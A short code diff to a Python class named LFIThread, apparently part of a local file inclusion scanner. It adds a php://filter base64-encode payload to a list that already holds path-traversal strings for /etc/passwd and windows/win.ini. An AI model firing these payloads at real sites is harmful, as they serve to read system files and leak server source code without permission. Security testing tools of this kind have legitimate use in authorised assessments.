@@ -20,7 +20,8 @@ class LFIThread(QThread):
             "../../../../windows/win.ini",
             "/etc/passwd",
             "./index.php", 
-            "index.php"
+            "index.php",
+            "php://filter/convert.base64-encode/resource=index.php"
         ]
         
         #duong dan file log
